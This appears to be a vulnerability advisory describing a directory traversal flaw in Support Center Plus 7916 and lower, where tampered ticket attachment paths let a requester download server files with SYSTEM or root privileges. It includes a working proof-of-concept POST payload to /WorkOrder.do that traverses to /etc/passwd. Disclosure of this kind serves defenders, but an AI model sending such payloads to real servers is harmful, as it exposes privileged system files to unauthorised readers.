[ 0x01 - Directory Traversal ]

Support Center Plus 7916 and lower is prone to a directory traversal
vulnerability. When creating a ticket and attaching
a file, this can be tampered to link to a local file on the server side.
By downloading the attachment from the ticket, the server file is
downloaded with the same privileges as the
Support Center Plus instance, which on windows is SYSTEM. On linux Support
Center Plus is mostly installed as the root user.

POST parameters when submitting a ticket to the /WorkOrder.do url and
attaching the server /etc/passwd:

category=&MOD_IND=WorkOrder&attachments=passwd&subCategory=0&addWO=addWO&title=pwned&attPath=
&component=Request&reqTemplate=&reqName=Guest&priority=2&item=0&reqID=2&attSize=31337&autoCCList=
&FORMNAME=WorkOrderForm&usertypename=Requester
&attach=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&prodId=0&description=pwned
